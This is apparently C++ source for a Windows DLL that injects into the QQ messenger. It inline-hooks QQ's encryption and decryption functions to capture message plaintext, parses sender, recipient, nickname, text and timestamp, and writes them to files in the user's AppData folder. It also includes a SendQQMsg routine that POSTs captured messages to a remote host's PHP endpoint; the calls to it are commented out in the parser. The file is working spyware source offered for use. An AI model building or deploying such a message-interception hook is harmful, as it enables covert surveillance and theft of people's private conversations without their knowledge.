
#include <time.h>

#include "Utils.h"

#include <iostream>

#include "HookQQMsgDll.h"

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"netapi32.lib")



int		g_iSysVer = 0;

QQ_oi_symmetry_decrypt2 my_qq_oi_symmetry_decrypt2 = 0;
QQ_oi_symmetry_encrypt2 my_qq_oi_symmetry_encrypt2 = 0;

BYTE g_aBackup_oi_symmetry_decrypt2[6] = { 0 };
BYTE g_aOpcode_oi_symmetry_decrypt2[6] = { 0 };
CRITICAL_SECTION g_cs_oi_symmetry_decrypt2;

BYTE g_aBackup_oi_symmetry_encrypt2[6] = { 0 };
BYTE g_aOpcode_oi_symmetry_encrypt2[6] = { 0 };
CRITICAL_SECTION g_cs_oi_symmetry_encrypt2;

char SAVE_SEND_PACK_FILE_NAME[MAX_PATH] = { 0 };
char SAVE_RECEIVE_PACK_FILE_NAME[MAX_PATH] = { 0 };
char QQ_MSG_FILE_NAME[MAX_PATH] = { 0 };
char HOOK_QQ_LOG_FILE_NAME[MAX_PATH] = { 0 };
char ERROR_PACKET_FILE_NAME[MAX_PATH] = { 0 };


int SendQQMsg(char* pData, int iSize)
{
	char* szHttpHdrFormat = \
		"POST http://%s/QQGroup/qqMsg/test.php HTTP/1.1\r\n"
		"Host: %s:80\r\n"
		"Content-Length: %u\r\n"
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		"Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\r\n"
		"Accept-Encoding: gzip, deflate\r\n"
		"Connection: keep-alive\r\n"
		"Cache-Control: no-cache\r\n\r\n%s";

	char szHttpPack[0x1000];
	int iLen = sprintf_s(szHttpPack, sizeof(szHttpPack), szHttpHdrFormat, HOST_IP_ADDR, HOST_IP_ADDR, iSize, pData);

	sockaddr_in stAddr = { 0 };
	stAddr.sin_family = AF_INET;
	stAddr.sin_port = ntohs(80);
	stAddr.sin_addr.S_un.S_addr = inet_addr(HOST_IP_ADDR);

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
		return FALSE;
	}

	int iRet = connect(sock, (sockaddr*)&stAddr, sizeof(sockaddr_in));
	if (iRet == INVALID_SOCKET)
	{
		iRet = closesocket(sock);
		return FALSE;
	}

	iRet = send(sock, szHttpPack, iLen, 0);
	if (iRet == INVALID_SOCKET)
	{
		iRet = closesocket(sock);
		return FALSE;
	}

	char szRecvBuf[0x1000];
	iRet = recv(sock, szRecvBuf, sizeof(szRecvBuf), 0);
	iRet = closesocket(sock);
	return TRUE;
}









int __stdcall ParseQQDataPack(char* Pack, int PackLen)
{
	char* pData = Pack;
	unsigned int iToQQ = 0;
	unsigned int iSenderQQ = 0;
	char strMsgTime[MAX_PATH] = { 0 };

	char strMsg[MAX_MESSAGE_LENGTH] = { 0 };

	DWORD dwHostQQ = ntohl(*(DWORD*)(Pack + 4));

	if (memcmp(pData + 8, "\x00\x00\x00\x08\x00\x01\x00\x04", 8) == 0)
	{
		iToQQ = ntohl(*(unsigned int*)(Pack + 4));
		iSenderQQ = ntohl(*(unsigned int*)Pack);
		pData = Pack + 8;
		goto TryFindMsg;
	}

	pData += 4;
	pData += 4;
	pData += 2;

	char* pTmp = pData;
	//group message
	pData = ViolenceSearch("\x00\x01\x00\x01\x01", 5, pData, PackLen - (pData - Pack));
	if (pData == 0)
	{
		pData = pTmp;
		pData = ViolenceSearch("\x01\x00\x0a\x00\x04\x01", 6, pData, PackLen - (pData - Pack));
		if (pData == 0)
		{
			iToQQ = ntohl(*(unsigned int*)(Pack + 4));
			iSenderQQ = ntohl(*(unsigned int*)Pack);
			pData = Pack + 8;
			goto TryFindMsg;
			//WriteLog(Pack,PackLen);
			//return FALSE;
		}

		pData = ViolenceSearch("\x03\x00", 2, pData, PackLen - (pData - Pack));
		if (pData == 0)
		{
			WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
			return FALSE;
		}
		pData += 4;

		iSenderQQ = ntohl(*(unsigned int*)pData);
		pData += 4;
		iToQQ = ntohl(*(unsigned int*)pData);
		pData += 4;

	TryFindMsg:
		pData = ViolenceSearch("\x4d\x53\x47", 3, pData, PackLen - (pData - Pack));
		if (pData == 0)
		{
			WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
			return FALSE;
		}

		errno_t error_t = 0;
		if (memcmp(pData, "\x00\x00\x00\x00\x00", 5) == 0)
		{
			time_t tmTime = ntohl(*(unsigned long*)(pData + 5));
			tm  sttmTime;
			error_t = localtime_s(&sttmTime, &tmTime);
			error_t = asctime_s(strMsgTime, MAX_PATH, (const tm*)&sttmTime);
		}
		else
		{
			WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
			return FALSE;
		}
		pData += 5;
		pData += 4;
		pData += 4;
		pData += 4;	//00 00 00 00

		pTmp = pData;
		pData = ViolenceSearch("\x86", 1, pData, 32);
		if (pData == 0)
		{
			pData = pTmp;
			pData = ViolenceSearch("\x22", 1, pData, 32);
			if (pData == 0)
			{
				pData = pTmp;
				pData = ViolenceSearch("\x0a\x00", 2, pData, 32);
				if (pData == 0)
				{
					pData = pTmp;
					pData = ViolenceSearch("\x0b\x00", 2, pData, 32);
					if (pData == 0)
					{
						WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
						return FALSE;
					}
				}
			}
		}
		pData += 8;

		pData = ViolenceSearch("\x00\x00", 2, pData, 32);
		if (pData == 0)
		{
			WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
			return FALSE;
		}
		pData--;

		int i = 0;
		int iFlag = 0;
		int iSecLen = ntohs(*(unsigned short*)(pData + 3));
		int iFirstLen = ntohs(*(unsigned short*)pData);
		if (iFirstLen == 3 || iFirstLen == 2)
		{
			pData += 2;
			pData += iFirstLen;
			iSecLen = ntohs(*(unsigned short*)pData);
			pData += 2;
		}
		else
		{
			for (i = 0; i < PackLen - (pData - Pack); i++)
			{
				if (*(pData + i + 2) != 1)
				{
					continue;
				}
				iSecLen = ntohs(*(unsigned short*)(pData + i + 3));
				iFirstLen = ntohs(*(unsigned short*)(pData + i));
				if (iFirstLen - iSecLen == 3)
				{
					iFlag = 1;
					break;
				}
			}

			if (iFlag == 0)
			{
				WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
				return FALSE;
			}

			pData += i;
			iSecLen = ntohs(*(unsigned short*)(pData + 3));
			iFirstLen = ntohs(*(unsigned short*)pData);
			pData += 5;
		}

		char strUtf8Msg[MAX_MESSAGE_LENGTH] = { 0 };
		memmove(strUtf8Msg, pData, iSecLen);
		char* pMsg = ConvertUtf8ToGBK(strUtf8Msg, strMsg);
		if (pMsg == 0)
		{
			WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
			return FALSE;
		}
		char strqqmsg[MAX_MESSAGE_LENGTH];
		int iLen = wsprintfA(strqqmsg, "buddy&cf&%u&cf&%u&cf&%u&cf&%s&cf&%s\r\n", dwHostQQ, iSenderQQ, iToQQ, strMsg, strMsgTime);
		if (iLen > 0)
		{
			//int iRet = SendQQMsg(strqqmsg,iLen);
			WriteLog(strqqmsg, iLen, WRITE_LOG_MSG);
			return TRUE;
		}
	}

	if (*(pData + 4) != 1)
	{
		//here is need to check it
		WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
		return FALSE;
	}

	iToQQ = ntohl(*(unsigned int*)pData);
	pData += 4;
	pData += 1;
	iSenderQQ = ntohl(*(unsigned int*)pData);
	pData += 4;
	pData = ViolenceSearch("\x4d\x53\x47", 3, pData, PackLen - (pData - Pack));
	if (pData == 0)
	{
		WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
		return FALSE;
	}

	errno_t error_t = 0;
	if (memcmp(pData, "\x00\x00\x00\x00\x00", 5) == 0)
	{
		time_t tmTime = ntohl(*(unsigned long*)(pData + 5));
		tm  sttmTime = { 0 };
		error_t = localtime_s(&sttmTime, &tmTime);
		error_t = asctime_s(strMsgTime, MAX_PATH, (const tm*)&sttmTime);
	}
	else
	{
		WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
		return FALSE;
	}

	pData += 5;
	pData += 4;
	pData += 4;
	pData += 4;	//00 00 00 00

	//set show charactors 
	pTmp = pData;
	pData = ViolenceSearch("\x86", 1, pData, 32);
	if (pData == 0)
	{
		pData = pTmp;
		pData = ViolenceSearch("\x22", 1, pData, 32);
		if (pData == 0)
		{
			pData = pTmp;
			pData = ViolenceSearch("\x0a\x00", 2, pData, 32);
			if (pData == 0)
			{
				pData = pTmp;
				pData = ViolenceSearch("\x0b\x00", 2, pData, 32);
				if (pData == 0)
				{
					WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
					return FALSE;
				}
			}
		}
	}
	pData += 8;

	pData = ViolenceSearch("\x00\x00", 2, pData, 32);
	if (pData == 0)
	{
		WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
		return FALSE;
	}
	pData--;

	int i = 0;
	int iFlag = 0;
	int iSecLen = ntohs(*(unsigned short*)(pData + 3));
	int iFirstLen = ntohs(*(unsigned short*)pData);
	if (iFirstLen == 3 || iFirstLen == 2)
	{
		pData += 2;
		pData += iFirstLen;
		iSecLen = ntohs(*(unsigned short*)pData);
		pData += 2;
	}
	else
	{
		for (i = 0; i < PackLen - (pData - Pack); i++)
		{
			if (*(pData + i + 2) != 1)
			{
				continue;
			}
			iSecLen = ntohs(*(unsigned short*)(pData + i + 3));
			iFirstLen = ntohs(*(unsigned short*)(pData + i));
			if (iFirstLen - iSecLen == 3)
			{
				iFlag = 1;
				break;
			}
		}

		if (iFlag == 0)
		{
			WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
			return FALSE;
		}

		pData += i;
		iSecLen = ntohs(*(unsigned short*)(pData + 3));
		iFirstLen = ntohs(*(unsigned short*)pData);
		pData += 5;
	}

	char strUtf8Msg[MAX_MESSAGE_LENGTH] = { 0 };
	memmove(strUtf8Msg, pData, iSecLen);
	char* pMsg = ConvertUtf8ToGBK(strUtf8Msg, strMsg);
	if (pMsg == 0)
	{
		WriteLog(Pack, PackLen, WRITE_LOG_ERROR_PACKET);
		return FALSE;
	}

	char strNick[QQ_NAME_MAX_SIZE] = { 0 };
	pData += iSecLen;
	pTmp = pData;
	pData = ViolenceSearch("\x00\x00\x02\x02", 4, pData, PackLen - (pData - Pack));
	if (pData == 0)
	{
		pData = pTmp;
		pData = ViolenceSearch("\x00\x00\x02\x01", 4, pData, PackLen - (pData - Pack));
		if (pData == 0)
		{
			pData = pTmp;
			pData = ViolenceSearch("\x00\x00\x01\x01", 4, pData, PackLen - (pData - Pack));
			if (pData == 0)
			{
				goto _GetNickName;
			}
		}
	}
	iFirstLen = ntohs(*(unsigned short*)pData);
	if (iFirstLen >= MAX_MESSAGE_LENGTH)
	{
		goto _GetNickName;
	}
	pData += 2;
	memset(strUtf8Msg, 0, MAX_MESSAGE_LENGTH);
	memmove(strUtf8Msg, pData, iFirstLen);

	char* pNick = ConvertUtf8ToGBK(strUtf8Msg, strNick);
	if (pNick == 0)
	{
		goto _GetNickName;
	}

_GetNickName:
	char strqqmsg[MAX_MESSAGE_LENGTH];
	int iLen = wsprintfA(strqqmsg, "group&cf&%u&cf&%u&cf&%s&cf&%u&cf&%s&cf&%s\r\n", dwHostQQ, iSenderQQ, strNick, iToQQ, strMsg, strMsgTime);
	if (iLen > 0)
	{
		//int iRet = SendQQMsg(strqqmsg,iLen);
		WriteLog(strqqmsg, iLen, WRITE_LOG_MSG);
		return TRUE;
	}
	return FALSE;
}















int __stdcall SaveQQMsg(char* strPack, int iPackLen, int iFlag)
{
	if (iPackLen <= 32)
	{
		return FALSE;
	}

	int iRet = ParseQQDataPack(strPack, iPackLen);

#ifdef _DEBUG
	if (iFlag == TRUE)
	{
		HANDLE hf = CreateFileA(SAVE_RECEIVE_PACK_FILE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if (hf == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}

		DWORD fsize = SetFilePointer(hf, 0, 0, FILE_END);
		if (fsize == INVALID_SET_FILE_POINTER)
		{
			CloseHandle(hf);
			return FALSE;
		}

		DWORD dwCnt;

		WriteFile(hf, "this is a new packet:", strlen("this is a new packet:"), &dwCnt, 0);

		int iRet = WriteFile(hf, strPack, iPackLen, &dwCnt, 0);
		if (iRet == 0 || dwCnt != iPackLen)
		{
			CloseHandle(hf);
			return FALSE;
		}

		CloseHandle(hf);
		return TRUE;
	}
	else if (iFlag == FALSE)
	{
		HANDLE hf = CreateFileA(SAVE_SEND_PACK_FILE_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if (hf == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}

		DWORD fsize = SetFilePointer(hf, 0, 0, FILE_END);
		if (fsize == INVALID_SET_FILE_POINTER)
		{
			CloseHandle(hf);
			return FALSE;
		}

		DWORD dwCnt;

		WriteFile(hf, "this is a new packet:", strlen("this is a new packet:"), &dwCnt, 0);

		int iRet = WriteFile(hf, strPack, iPackLen, &dwCnt, 0);
		if (iRet == 0 || dwCnt != iPackLen)
		{
			CloseHandle(hf);
			return FALSE;
		}

		CloseHandle(hf);
		return TRUE;
	}
#endif

	return FALSE;
}








//Hook the target API
BOOL  __stdcall MonitorBase_oi_symmetry_decrypt2()
{
	HANDLE g_hProc = GetCurrentProcess();
	//Modify the heading 6 bytes opcode in target API to jmp instruction,the jmp instruction will lead the EIP to our fake function
	ReadProcessMemory(g_hProc, LPVOID(my_qq_oi_symmetry_decrypt2), LPVOID(g_aBackup_oi_symmetry_decrypt2), sizeof(g_aBackup_oi_symmetry_decrypt2) / sizeof(g_aBackup_oi_symmetry_decrypt2[0]), NULL);
	return WriteProcessMemory(g_hProc, LPVOID(my_qq_oi_symmetry_decrypt2), LPVOID(g_aOpcode_oi_symmetry_decrypt2), sizeof(g_aOpcode_oi_symmetry_decrypt2) / sizeof(g_aOpcode_oi_symmetry_decrypt2[0]), NULL);
}

//Hook the target API
BOOL  __stdcall MonitorBase_oi_symmetry_encrypt2()
{
	HANDLE g_hProc = GetCurrentProcess();
	//Modify the heading 6 bytes opcode in target API to jmp instruction,the jmp instruction will lead the EIP to our fake function
	ReadProcessMemory(g_hProc, LPVOID(my_qq_oi_symmetry_encrypt2), LPVOID(g_aBackup_oi_symmetry_encrypt2), sizeof(g_aBackup_oi_symmetry_encrypt2) / sizeof(g_aBackup_oi_symmetry_encrypt2[0]), NULL);
	return WriteProcessMemory(g_hProc, LPVOID(my_qq_oi_symmetry_encrypt2), LPVOID(g_aOpcode_oi_symmetry_encrypt2), sizeof(g_aOpcode_oi_symmetry_encrypt2) / sizeof(g_aOpcode_oi_symmetry_encrypt2[0]), NULL);
}



BOOL  __stdcall ReleaseBase_oi_symmetry_decrypt2()
{
	HANDLE g_hProc = GetCurrentProcess();
	//The pseudo handle need not be closed when it is no longer needed.
	// Calling the CloseHandle function with a pseudo handle has no effect.
	// If the pseudo handle is duplicated by DuplicateHandle, the duplicate handle must be closed.

	return WriteProcessMemory(g_hProc, LPVOID(my_qq_oi_symmetry_decrypt2), LPVOID(g_aBackup_oi_symmetry_decrypt2), sizeof(g_aBackup_oi_symmetry_decrypt2) / sizeof(g_aBackup_oi_symmetry_decrypt2[0]), NULL);
}

BOOL  __stdcall ReleaseBase_oi_symmetry_encrypt2()
{
	HANDLE g_hProc = GetCurrentProcess();

	return WriteProcessMemory(g_hProc, LPVOID(my_qq_oi_symmetry_encrypt2), LPVOID(g_aBackup_oi_symmetry_encrypt2), sizeof(g_aBackup_oi_symmetry_encrypt2) / sizeof(g_aBackup_oi_symmetry_encrypt2[0]), NULL);
}




void __cdecl MonFunc_oi_symmetry_decrypt2(char* strSrc, unsigned int iSrcLen, char* strKey, char* strDst, int* iDstLen)
{
	//can not return before call the source function

	//Thread safety
	//EnterCriticalSection(&g_cs_oi_symmetry_decrypt2);
	//here u can do something u want to do

	//Restore the original API before calling it
	ReleaseBase_oi_symmetry_decrypt2();

	//u must restore the api then u can call it
	my_qq_oi_symmetry_decrypt2(strSrc, iSrcLen, strKey, strDst, iDstLen);

	int iRet = SaveQQMsg(strDst, *iDstLen, TRUE);

	MonitorBase_oi_symmetry_decrypt2();

	//You can do anything here, and you can call the UninstallMonitor
	//when you want to leave.

	//Thread safety
	//LeaveCriticalSection(&g_cs_oi_symmetry_decrypt2);

	return;
}


//do nothing except u want to do
void __cdecl MonFunc_oi_symmetry_encrypt2(char* strSrc, unsigned int iSrcLen, char* strKey, char* strDst, int* iDstLen)
{
	//can not return before call the source function
	//Thread safety
	//here must cause some problem
	//EnterCriticalSection(&g_cs_oi_symmetry_encrypt2);

	//here u can do something u want to do
	int iRet = SaveQQMsg(strSrc, iSrcLen, FALSE);

	//Restore the original API before calling it
	ReleaseBase_oi_symmetry_encrypt2();

	my_qq_oi_symmetry_encrypt2(strSrc, iSrcLen, strKey, strDst, iDstLen);

	MonitorBase_oi_symmetry_encrypt2();

	//You can do anything here, and you can call the UninstallMonitor
	//when you want to leave.

	//Thread safety
	//LeaveCriticalSection(&g_cs_oi_symmetry_encrypt2);

	return;
}





//SaveMsg194 function is in KernelUtil.dll,but new version qq not use
BOOL  __stdcall InstallMonitor_oi_symmetry_decrypt2()
{
	char strerror[MAX_PATH] = { 0 };
	HINSTANCE hins = GetModuleHandleA(HOOKED_DLL_NAME);
	if (hins == 0)
	{
		hins = LoadLibraryA(HOOKED_DLL_NAME);
		if (hins == 0)
		{
			wsprintfA(strerror, "Common.dll load error code is:%u\r\n", GetLastError());
			WriteLog(strerror, lstrlenA(strerror), WRITE_LOG_ERROR);
			return FALSE;
		}
	}

	// 		my_qq_oi_symmetry_decrypt2 = (QQ_oi_symmetry_decrypt2)GetProcAddress((HMODULE)hins,HOOKED_FUNCTION_NAME_oi_symmetry_decrypt2);
	// 		if (my_qq_oi_symmetry_decrypt2 == 0)
	// 		{
	// 			MessageBoxA(0,"GetProcAddress my_qq_oi_symmetry_decrypt2 error","GetProcAddress my_qq_oi_symmetry_decrypt2 error",MB_OK);
	// 		}
	// 		else
	// 		{
	// 			MessageBoxA(0,"GetProcAddress my_qq_oi_symmetry_decrypt2 ok","GetProcAddress my_qq_oi_symmetry_decrypt2 ok",MB_OK);
	// 		}

	my_qq_oi_symmetry_decrypt2 = (QQ_oi_symmetry_decrypt2)GetApiAddrFromDll((int)hins, HOOKED_FUNCTION_NAME_oi_symmetry_decrypt2,
		lstrlenA(HOOKED_FUNCTION_NAME_oi_symmetry_decrypt2));
	if (my_qq_oi_symmetry_decrypt2 == 0)
	{
		wsprintfA(strerror, "GetApiAddrFromDll error code is:%08x\r\n", GetLastError());
		WriteLog(strerror, strlen(strerror), WRITE_LOG_ERROR);
		return FALSE;
	}

	g_aOpcode_oi_symmetry_decrypt2[0] = 0xE9;
	//dest - now - 5
	*(DWORD*)(&g_aOpcode_oi_symmetry_decrypt2[1]) = (DWORD)MonFunc_oi_symmetry_decrypt2 - (DWORD)my_qq_oi_symmetry_decrypt2 - 5;

	//InitializeCriticalSection(&g_cs_oi_symmetry_decrypt2);
	return MonitorBase_oi_symmetry_decrypt2();
}



BOOL  __stdcall InstallMonitor_oi_symmetry_encrypt2()
{
	char strerror[MAX_PATH] = { 0 };
	HINSTANCE hins = GetModuleHandleA(HOOKED_DLL_NAME);
	if (hins == 0)
	{
		hins = LoadLibraryA(HOOKED_DLL_NAME);
		if (hins == 0)
		{
			wsprintfA(strerror, "Common.dll not found,error code is:%u\r\n", GetLastError());
			WriteLog(strerror, strlen(strerror), WRITE_LOG_ERROR);
			return FALSE;
		}
	}

	my_qq_oi_symmetry_encrypt2 = (QQ_oi_symmetry_encrypt2)GetApiAddrFromDll((UINT)hins, HOOKED_FUNCTION_NAME_oi_symmetry_encrypt2,
		lstrlenA(HOOKED_FUNCTION_NAME_oi_symmetry_encrypt2));
	if (my_qq_oi_symmetry_encrypt2 == 0)
	{
		wsprintfA(strerror, "GetApiAddrFromDll error code is:%08x\r\n", GetLastError());
		WriteLog(strerror, strlen(strerror), WRITE_LOG_ERROR);
		return FALSE;
	}

	g_aOpcode_oi_symmetry_encrypt2[0] = 0xE9;
	//offset = dest - now - 5
	*(DWORD*)(&g_aOpcode_oi_symmetry_encrypt2[1]) = (DWORD)MonFunc_oi_symmetry_encrypt2 - (DWORD)my_qq_oi_symmetry_encrypt2 - 5;

	//InitializeCriticalSection(&g_cs_oi_symmetry_encrypt2);
	return MonitorBase_oi_symmetry_encrypt2();
}



BOOL  __stdcall UninstallMonitor_oi_symmetry_decrypt2()
{
	//Release monitor
	if (!ReleaseBase_oi_symmetry_decrypt2())
	{
		return FALSE;
	}

	//DeleteCriticalSection(&g_cs_oi_symmetry_decrypt2);

	return TRUE;

	//Synchronize to main application, release semaphore to free injector
	HANDLE hSema = OpenSemaphoreA(EVENT_ALL_ACCESS, FALSE, SEMPHORE_NAME);
	if (hSema == NULL)
	{
		return TRUE;
	}
	HANDLE g_hProc = GetCurrentProcess();
	return ReleaseSemaphore(hSema, 1, (LPLONG)g_hProc);
}


//this must be first one if you want to release inject dll
BOOL  __stdcall UninstallMonitor_oi_symmetry_encrypt2()
{

	//Release monitor
	if (!ReleaseBase_oi_symmetry_encrypt2())
	{
		return FALSE;
	}

	//DeleteCriticalSection(&g_cs_oi_symmetry_encrypt2);

	return TRUE;

	//Synchronize to main application, release semaphore to free injector
	HANDLE hSema = OpenSemaphoreA(EVENT_ALL_ACCESS, FALSE, SEMPHORE_NAME);
	if (hSema == NULL)
	{
		return TRUE;
	}
	HANDLE g_hProc = GetCurrentProcess();
	return ReleaseSemaphore(hSema, 1, (LPLONG)g_hProc);
}


int  __stdcall InitVariables()
{

	g_iSysVer = GetWindowsVersion();

	char szUserName[MAX_PATH] = { 0 };
	DWORD dwBufSize = MAX_PATH;
	int iRet = GetUserNameA(szUserName, &dwBufSize);

	char szSysDir[MAX_PATH];
	iRet = GetSystemDirectoryA(szSysDir, MAX_PATH);

	char szLogFileName[] = "hooked_qq_log.txt";
	char szMsgFileName[] = "hooked_qq_msg.txt";
	char szRecvFileName[] = "hooked_qq_recvpack.txt";
	char szSendFileName[] = "hooked_qq_sendpack.txt";
	char szErrorPacketFileName[] = "hook_qq_error_packet.txt";

	char szPathFormat[] = "C:\\Users\\%s\\AppData\\local\\%s";
	char szPathFormatXP[] = "C:\\Documents and Settings\\%s\\Local Settings\\%s";
	szPathFormatXP[0] = szSysDir[0];
	szPathFormat[0] = szSysDir[0];

	if (g_iSysVer >= SYSTEM_VERSION_VISTA)
	{
		wsprintfA(QQ_MSG_FILE_NAME, szPathFormat, szUserName, szMsgFileName);
		wsprintfA(ERROR_PACKET_FILE_NAME, szPathFormat, szUserName, szErrorPacketFileName);
		wsprintfA(SAVE_RECEIVE_PACK_FILE_NAME, szPathFormat, szUserName, szRecvFileName);
		wsprintfA(SAVE_SEND_PACK_FILE_NAME, szPathFormat, szUserName, szSendFileName);
		wsprintfA(HOOK_QQ_LOG_FILE_NAME, szPathFormat, szUserName, szLogFileName);
	}
	else
	{
		wsprintfA(QQ_MSG_FILE_NAME, szPathFormatXP, szUserName, szMsgFileName);
		wsprintfA(ERROR_PACKET_FILE_NAME, szPathFormatXP, szUserName, szErrorPacketFileName);
		wsprintfA(SAVE_RECEIVE_PACK_FILE_NAME, szPathFormatXP, szUserName, szRecvFileName);
		wsprintfA(SAVE_SEND_PACK_FILE_NAME, szPathFormatXP, szUserName, szSendFileName);
		wsprintfA(HOOK_QQ_LOG_FILE_NAME, szPathFormatXP, szUserName, szLogFileName);
	}

	WSADATA stWsa = { 0 };
	iRet = WSAStartup(0x202, &stWsa);
	if (iRet)
	{
		return FALSE;
	}

	InitializeCriticalSection(&g_cs_oi_symmetry_encrypt2);
	InitializeCriticalSection(&g_cs_oi_symmetry_decrypt2);
	return TRUE;
}



BOOL WINAPI DllMain(HINSTANCE hInstDll, DWORD fdwReason, LPVOID lpvReserved)
{

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	{
		DisableThreadLibraryCalls(hInstDll);
		HMODULE hm = LoadLibraryA("HookQQMsgDll.dll");
		//if (hm == 0)
		{
			InitVariables();
			InstallMonitor_oi_symmetry_decrypt2();
			InstallMonitor_oi_symmetry_encrypt2();
		}
	}
	break;
	case DLL_PROCESS_DETACH:
	{
		HMODULE hm = LoadLibraryA("HookQQMsgDll.dll");
		//if (hm)
		{
			UninstallMonitor_oi_symmetry_decrypt2();
			UninstallMonitor_oi_symmetry_encrypt2();

			DeleteCriticalSection(&g_cs_oi_symmetry_decrypt2);
			DeleteCriticalSection(&g_cs_oi_symmetry_encrypt2);
		}
	}
	break;
	}

	return TRUE;
}
